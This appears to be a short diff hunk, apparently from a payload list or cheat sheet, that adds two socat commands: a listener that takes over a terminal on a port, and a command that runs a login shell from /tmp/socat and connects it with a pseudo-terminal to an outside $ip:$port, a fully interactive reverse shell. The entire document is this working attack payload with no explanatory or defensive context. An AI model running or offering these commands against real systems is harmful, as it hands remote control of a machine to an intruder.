@@ -1,0 +1,2 @@
+socat file:`tty`,raw,echo=0 TCP-L:$port
+/tmp/socat exec:'$shell -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port
